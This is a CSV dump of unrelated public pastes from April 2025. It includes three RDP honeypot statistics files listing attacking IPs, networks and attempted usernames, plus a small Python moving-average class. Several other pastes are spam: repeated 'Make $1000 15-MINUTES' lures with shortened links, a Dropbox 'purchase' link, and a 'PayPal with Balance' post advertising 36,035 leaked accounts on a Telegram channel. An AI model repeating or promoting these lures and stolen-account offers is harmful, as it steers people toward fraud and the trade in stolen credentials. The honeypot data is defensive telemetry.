id,title,username,language,date,content
Q9GV4Wqj,2025-04-24_stats.json,rdp_snitch,JSON,Thursday 24th of April 2025 07:18:27 PM CDT,"{
  ""ip"": {
    ""152.230.66.217"": 990,
    ""80.94.95.198"": 54,
    ""211.185.207.14"": 30,
    ""91.238.181.91"": 6,
    ""71.82.170.60"": 30,
    ""194.165.16.165"": 6,
    ""38.165.7.74"": 6,
    ""205.210.31.163"": 9,
    ""152.32.252.94"": 3,
    ""193.176.22.13"": 18,
    ""62.60.188.24"": 3,
    ""167.71.75.52"": 75,
    ""52.142.43.71"": 192,
    ""156.227.234.181"": 3,
    ""205.210.31.94"": 9,
    ""221.181.44.30"": 6,
    ""88.214.50.50"": 18,
    ""191.96.106.18"": 3132,
    ""80.94.95.90"": 3,
    ""61.219.85.85"": 3,
    ""198.235.24.55"": 9,
    ""91.238.181.93"": 6,
    ""165.154.58.251"": 3,
    ""194.165.16.163"": 6,
    ""212.56.53.170"": 1635,
    ""37.61.243.211"": 3,
    ""159.89.6.147"": 600,
    ""147.185.132.210"": 9,
    ""167.94.145.97"": 3
  },
  ""asn"": {
    ""AS14259"": 990,
    ""AS204428"": 57,
    ""AS4766"": 30,
    ""AS49434"": 12,
    ""AS20115"": 30,
    ""AS48721"": 12,
    ""AS23470"": 6,
    ""AS396982"": 36,
    ""AS135377"": 6,
    ""Unknown"": 1671,
    ""AS215930"": 3,
    ""AS14061"": 675,
    ""AS8075"": 192,
    ""AS138152"": 3,
    ""AS9808"": 6,
    ""AS174"": 3132,
    ""AS3462"": 3,
    ""AS30781"": 3,
    ""AS398705"": 3
  },
  ""isp"": {
    ""Gtd Internet S.A."": 990,
    ""SS-Net"": 57,
    ""Korea Telecom"": 30,
    ""Datacenter location PAR1 France"": 12,
    ""Charter Communications"": 30,
    ""Flyservers S.A."": 12,
    ""ReliableSite.Net LLC"": 6,
    ""Google LLC"": 36,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""SIA \""Singularity Telecom\"""": 36,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 3,
    ""DigitalOcean, LLC"": 675,
    ""Microsoft Corporation"": 192,
    ""Yisu Cloud Ltd"": 3,
    ""China Mobile communications corporation"": 6,
    ""Cogent Communications"": 3132,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""VPN Consumer Ashburn"": 1635,
    ""DC4Data"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""Gtd Internet S.A"": 990,
    ""Unmanaged LTD"": 57,
    ""Kornet"": 30,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Spectrum"": 30,
    ""Flyservers S.A"": 12,
    ""PEG Tech Inc"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""SIA \""Singularity Telecom\"""": 36,
    ""UAB Host Baltic"": 3,
    ""DigitalOcean, LLC"": 675,
    ""Microsoft Azure Cloud (eastus)"": 192,
    ""Yisu Cloud Ltd"": 3,
    ""China Mobile"": 6,
    ""Ipxo"": 3132,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Ucloud Information Technology"": 3,
    ""VPN Consumer Ashburn, VA, United States"": 1635,
    ""DcforData SRL"": 3,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""Santiago Metropolitan"": 990,
    ""Budapest"": 57,
    ""Sejong-si"": 30,
    ""\u00cele-de-France"": 12,
    ""Wisconsin"": 30,
    ""Kaunas"": 12,
    ""California"": 4809,
    ""Kowloon"": 3,
    ""New York"": 36,
    ""Tehran"": 3,
    ""North Holland"": 75,
    ""Virginia"": 192,
    ""\u014csaka"": 3,
    ""Guangdong"": 6,
    ""New Taipei City"": 3,
    ""Metro Manila"": 3,
    ""Auvergne-Rh\u00f4ne-Alpes"": 3,
    ""Hesse"": 600,
    ""Michigan"": 3
  },
  ""country"": {
    ""Chile"": 990,
    ""Hungary"": 57,
    ""South Korea"": 30,
    ""France"": 15,
    ""United States"": 5070,
    ""Lithuania"": 12,
    ""Hong Kong"": 3,
    ""Iran"": 3,
    ""The Netherlands"": 75,
    ""Japan"": 3,
    ""China"": 6,
    ""Taiwan"": 3,
    ""Philippines"": 3,
    ""Germany"": 600
  },
  ""account"": {
    ""hello"": 6648,
    ""142.93.8.59"": 114,
    ""Test"": 36,
    ""QRMupMsWI"": 3,
    ""KJpCKf"": 3,
    ""wcJlYu"": 3,
    ""Administrator"": 6,
    ""hLgdNOvGE"": 3,
    ""UyvLBl"": 3,
    ""UVHSHx"": 3,
    ""Domain"": 24,
    ""Administr"": 3,
    ""hpOvyxCBc"": 3,
    ""SUcNWJ"": 3,
    ""IzgcEw"": 3,
    ""aEEaxVaWV"": 3,
    ""KOUPop"": 3,
    ""fbYjWP"": 3,
    ""(empty)"": 3
  },
  ""keyboard"": {
    ""Unknown"": 6870
  },
  ""client_build"": {
    ""Unknown"": 6870
  },
  ""client_name"": {
    ""Unknown"": 6870
  },
  ""ip_type"": {
    ""Unknown"": 2802,
    ""hosting"": 921,
    ""hosting & proxy"": 9,
    ""mobile"": 6,
    ""proxy"": 3132
  }
}"
KgUjuGPV,Make $1000 15-MINUTES (BEGINNER) 96,vinevibes,JavaScript,Thursday 24th of April 2025 07:17:52 PM CDT," 
Pdf https://tinyurl.com/privguidee

IHrTonX4A1
"
kifd6Ybg,2025-04-24_stats.json,rdp_snitch,JSON,Thursday 24th of April 2025 07:16:19 PM CDT,"{
  ""ip"": {
    ""152.230.66.217"": 660,
    ""80.94.95.198"": 36,
    ""211.185.207.14"": 20,
    ""91.238.181.91"": 4,
    ""71.82.170.60"": 20,
    ""194.165.16.165"": 4,
    ""38.165.7.74"": 4,
    ""205.210.31.163"": 6,
    ""152.32.252.94"": 2,
    ""193.176.22.13"": 12,
    ""62.60.188.24"": 2,
    ""167.71.75.52"": 50,
    ""52.142.43.71"": 128,
    ""156.227.234.181"": 2,
    ""205.210.31.94"": 6,
    ""221.181.44.30"": 4,
    ""88.214.50.50"": 12,
    ""191.96.106.18"": 2088,
    ""80.94.95.90"": 2,
    ""61.219.85.85"": 2,
    ""198.235.24.55"": 6,
    ""91.238.181.93"": 4,
    ""165.154.58.251"": 2,
    ""194.165.16.163"": 4,
    ""212.56.53.170"": 1090,
    ""37.61.243.211"": 2,
    ""159.89.6.147"": 400,
    ""147.185.132.210"": 6,
    ""167.94.145.97"": 2
  },
  ""asn"": {
    ""AS14259"": 660,
    ""AS204428"": 38,
    ""AS4766"": 20,
    ""AS49434"": 8,
    ""AS20115"": 20,
    ""AS48721"": 8,
    ""AS23470"": 4,
    ""AS396982"": 24,
    ""AS135377"": 4,
    ""Unknown"": 1114,
    ""AS215930"": 2,
    ""AS14061"": 450,
    ""AS8075"": 128,
    ""AS138152"": 2,
    ""AS9808"": 4,
    ""AS174"": 2088,
    ""AS3462"": 2,
    ""AS30781"": 2,
    ""AS398705"": 2
  },
  ""isp"": {
    ""Gtd Internet S.A."": 660,
    ""SS-Net"": 38,
    ""Korea Telecom"": 20,
    ""Datacenter location PAR1 France"": 8,
    ""Charter Communications"": 20,
    ""Flyservers S.A."": 8,
    ""ReliableSite.Net LLC"": 4,
    ""Google LLC"": 24,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""SIA \""Singularity Telecom\"""": 24,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 2,
    ""DigitalOcean, LLC"": 450,
    ""Microsoft Corporation"": 128,
    ""Yisu Cloud Ltd"": 2,
    ""China Mobile communications corporation"": 4,
    ""Cogent Communications"": 2088,
    ""Chunghwa Telecom Co., Ltd."": 2,
    ""VPN Consumer Ashburn"": 1090,
    ""DC4Data"": 2,
    ""Censys, Inc."": 2
  },
  ""org"": {
    ""Gtd Internet S.A"": 660,
    ""Unmanaged LTD"": 38,
    ""Kornet"": 20,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""Spectrum"": 20,
    ""Flyservers S.A"": 8,
    ""PEG Tech Inc"": 4,
    ""Palo Alto Networks, Inc"": 24,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""SIA \""Singularity Telecom\"""": 24,
    ""UAB Host Baltic"": 2,
    ""DigitalOcean, LLC"": 450,
    ""Microsoft Azure Cloud (eastus)"": 128,
    ""Yisu Cloud Ltd"": 2,
    ""China Mobile"": 4,
    ""Ipxo"": 2088,
    ""Chunghwa Telecom Co. Ltd."": 2,
    ""Ucloud Information Technology"": 2,
    ""VPN Consumer Ashburn, VA, United States"": 1090,
    ""DcforData SRL"": 2,
    ""Censys, Inc."": 2
  },
  ""regionName"": {
    ""Santiago Metropolitan"": 660,
    ""Budapest"": 38,
    ""Sejong-si"": 20,
    ""\u00cele-de-France"": 8,
    ""Wisconsin"": 20,
    ""Kaunas"": 8,
    ""California"": 3206,
    ""Kowloon"": 2,
    ""New York"": 24,
    ""Tehran"": 2,
    ""North Holland"": 50,
    ""Virginia"": 128,
    ""\u014csaka"": 2,
    ""Guangdong"": 4,
    ""New Taipei City"": 2,
    ""Metro Manila"": 2,
    ""Auvergne-Rh\u00f4ne-Alpes"": 2,
    ""Hesse"": 400,
    ""Michigan"": 2
  },
  ""country"": {
    ""Chile"": 660,
    ""Hungary"": 38,
    ""South Korea"": 20,
    ""France"": 10,
    ""United States"": 3380,
    ""Lithuania"": 8,
    ""Hong Kong"": 2,
    ""Iran"": 2,
    ""The Netherlands"": 50,
    ""Japan"": 2,
    ""China"": 4,
    ""Taiwan"": 2,
    ""Philippines"": 2,
    ""Germany"": 400
  },
  ""account"": {
    ""hello"": 4432,
    ""142.93.8.59"": 76,
    ""Test"": 24,
    ""QRMupMsWI"": 2,
    ""KJpCKf"": 2,
    ""wcJlYu"": 2,
    ""Administrator"": 4,
    ""hLgdNOvGE"": 2,
    ""UyvLBl"": 2,
    ""UVHSHx"": 2,
    ""Domain"": 16,
    ""Administr"": 2,
    ""hpOvyxCBc"": 2,
    ""SUcNWJ"": 2,
    ""IzgcEw"": 2,
    ""aEEaxVaWV"": 2,
    ""KOUPop"": 2,
    ""fbYjWP"": 2,
    ""(empty)"": 2
  },
  ""keyboard"": {
    ""Unknown"": 4580
  },
  ""client_build"": {
    ""Unknown"": 4580
  },
  ""client_name"": {
    ""Unknown"": 4580
  },
  ""ip_type"": {
    ""Unknown"": 1868,
    ""hosting"": 614,
    ""hosting & proxy"": 6,
    ""mobile"": 4,
    ""proxy"": 2088
  }
}"
yQkW4wQX,2025-04-24_stats.json,rdp_snitch,JSON,Thursday 24th of April 2025 07:15:10 PM CDT,"{
  ""ip"": {
    ""152.230.66.217"": 330,
    ""80.94.95.198"": 18,
    ""211.185.207.14"": 10,
    ""91.238.181.91"": 2,
    ""71.82.170.60"": 10,
    ""194.165.16.165"": 2,
    ""38.165.7.74"": 2,
    ""205.210.31.163"": 3,
    ""152.32.252.94"": 1,
    ""193.176.22.13"": 6,
    ""62.60.188.24"": 1,
    ""167.71.75.52"": 25,
    ""52.142.43.71"": 64,
    ""156.227.234.181"": 1,
    ""205.210.31.94"": 3,
    ""221.181.44.30"": 2,
    ""88.214.50.50"": 6,
    ""191.96.106.18"": 1044,
    ""80.94.95.90"": 1,
    ""61.219.85.85"": 1,
    ""198.235.24.55"": 3,
    ""91.238.181.93"": 2,
    ""165.154.58.251"": 1,
    ""194.165.16.163"": 2,
    ""212.56.53.170"": 545,
    ""37.61.243.211"": 1,
    ""159.89.6.147"": 200,
    ""147.185.132.210"": 3,
    ""167.94.145.97"": 1
  },
  ""asn"": {
    ""AS14259"": 330,
    ""AS204428"": 19,
    ""AS4766"": 10,
    ""AS49434"": 4,
    ""AS20115"": 10,
    ""AS48721"": 4,
    ""AS23470"": 2,
    ""AS396982"": 12,
    ""AS135377"": 2,
    ""Unknown"": 557,
    ""AS215930"": 1,
    ""AS14061"": 225,
    ""AS8075"": 64,
    ""AS138152"": 1,
    ""AS9808"": 2,
    ""AS174"": 1044,
    ""AS3462"": 1,
    ""AS30781"": 1,
    ""AS398705"": 1
  },
  ""isp"": {
    ""Gtd Internet S.A."": 330,
    ""SS-Net"": 19,
    ""Korea Telecom"": 10,
    ""Datacenter location PAR1 France"": 4,
    ""Charter Communications"": 10,
    ""Flyservers S.A."": 4,
    ""ReliableSite.Net LLC"": 2,
    ""Google LLC"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""SIA \""Singularity Telecom\"""": 12,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 1,
    ""DigitalOcean, LLC"": 225,
    ""Microsoft Corporation"": 64,
    ""Yisu Cloud Ltd"": 1,
    ""China Mobile communications corporation"": 2,
    ""Cogent Communications"": 1044,
    ""Chunghwa Telecom Co., Ltd."": 1,
    ""VPN Consumer Ashburn"": 545,
    ""DC4Data"": 1,
    ""Censys, Inc."": 1
  },
  ""org"": {
    ""Gtd Internet S.A"": 330,
    ""Unmanaged LTD"": 19,
    ""Kornet"": 10,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Spectrum"": 10,
    ""Flyservers S.A"": 4,
    ""PEG Tech Inc"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""SIA \""Singularity Telecom\"""": 12,
    ""UAB Host Baltic"": 1,
    ""DigitalOcean, LLC"": 225,
    ""Microsoft Azure Cloud (eastus)"": 64,
    ""Yisu Cloud Ltd"": 1,
    ""China Mobile"": 2,
    ""Ipxo"": 1044,
    ""Chunghwa Telecom Co. Ltd."": 1,
    ""Ucloud Information Technology"": 1,
    ""VPN Consumer Ashburn, VA, United States"": 545,
    ""DcforData SRL"": 1,
    ""Censys, Inc."": 1
  },
  ""regionName"": {
    ""Santiago Metropolitan"": 330,
    ""Budapest"": 19,
    ""Sejong-si"": 10,
    ""\u00cele-de-France"": 4,
    ""Wisconsin"": 10,
    ""Kaunas"": 4,
    ""California"": 1603,
    ""Kowloon"": 1,
    ""New York"": 12,
    ""Tehran"": 1,
    ""North Holland"": 25,
    ""Virginia"": 64,
    ""\u014csaka"": 1,
    ""Guangdong"": 2,
    ""New Taipei City"": 1,
    ""Metro Manila"": 1,
    ""Auvergne-Rh\u00f4ne-Alpes"": 1,
    ""Hesse"": 200,
    ""Michigan"": 1
  },
  ""country"": {
    ""Chile"": 330,
    ""Hungary"": 19,
    ""South Korea"": 10,
    ""France"": 5,
    ""United States"": 1690,
    ""Lithuania"": 4,
    ""Hong Kong"": 1,
    ""Iran"": 1,
    ""The Netherlands"": 25,
    ""Japan"": 1,
    ""China"": 2,
    ""Taiwan"": 1,
    ""Philippines"": 1,
    ""Germany"": 200
  },
  ""account"": {
    ""hello"": 2216,
    ""142.93.8.59"": 38,
    ""Test"": 12,
    ""QRMupMsWI"": 1,
    ""KJpCKf"": 1,
    ""wcJlYu"": 1,
    ""Administrator"": 2,
    ""hLgdNOvGE"": 1,
    ""UyvLBl"": 1,
    ""UVHSHx"": 1,
    ""Domain"": 8,
    ""Administr"": 1,
    ""hpOvyxCBc"": 1,
    ""SUcNWJ"": 1,
    ""IzgcEw"": 1,
    ""aEEaxVaWV"": 1,
    ""KOUPop"": 1,
    ""fbYjWP"": 1,
    ""(empty)"": 1
  },
  ""keyboard"": {
    ""Unknown"": 2290
  },
  ""client_build"": {
    ""Unknown"": 2290
  },
  ""client_name"": {
    ""Unknown"": 2290
  },
  ""ip_type"": {
    ""Unknown"": 934,
    ""hosting"": 307,
    ""hosting & proxy"": 3,
    ""mobile"": 2,
    ""proxy"": 1044
  }
}"
Z0Mbev8n,PayPal with Balance,iLoveToWatch,JavaScript,Thursday 24th of April 2025 07:13:59 PM CDT,36035 Accounts Posted On https://t.me/leakedbyeminem
g7hcCqca,Moving average from datastream,smj007,Python,Thursday 24th of April 2025 07:08:50 PM CDT,"class MovingAverage:

    def __init__(self, size: int):
        self.nums = []
        self.size = size
        self.running_sum = 0

    def next(self, val: int) -> float:

		# mistake done here was not defining running_sum globally
		# running_sum = 0 <-- this is wrong since you are resetting everytime 
        if len(self.nums) < self.size:
            self.running_sum += val
            self.nums.append(val)
            return (self.running_sum*1.0)/(len(self.nums))
        else:
            self.running_sum = self.running_sum + val - self.nums[0]
            self.nums = self.nums[1:]
            self.nums.append(val)
            return self.running_sum/(self.size*1.0)
        "
9WBfK4TK,EARN $900 INSTANTLY 2025⭐ NU,vinevibes,JavaScript,Thursday 24th of April 2025 07:08:35 PM CDT," 
Pdf https://tinyurl.com/privguidee

KAE5iKuoKy
"
i4hYJcmx,your purchase,anantsoftcomputing,JavaScript,Thursday 24th of April 2025 07:05:53 PM CDT,"new here https://www.dropbox.com/scl/fi/k9c0tnm7rqaio4dvw29dc/new.pdf?rlkey=bplo5rw9q7027uia1i0ilh8c7&st=a54g8xqm&dl=0
enjoy"
eVH9ShWx,js,29JeffGamez,JavaScript,Thursday 24th of April 2025 07:00:32 PM CDT,"const cars = [""Saab"", ""Volvo"", ""BMW""];"
Rjj5Mmyu,Make $1000 15-MINUTES  (BEGINNER) ME,vinevibes,JavaScript,Thursday 24th of April 2025 06:59:20 PM CDT," 
Pdf https://tinyurl.com/privguidee

zNOh5fsjLH
"
